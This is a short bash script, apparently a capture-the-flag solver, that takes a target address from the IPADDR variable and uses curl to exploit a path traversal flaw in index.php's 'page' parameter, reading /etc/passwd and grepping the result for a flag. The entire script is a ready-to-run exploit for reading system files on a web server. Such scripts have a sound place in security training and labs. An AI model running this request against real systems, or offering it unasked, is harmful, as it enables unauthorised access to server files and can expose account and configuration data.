#!/bin/bash

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

curl -s "http://$IPADDR/index.php?page=../../../../../../../etc/passwd" | grep flag 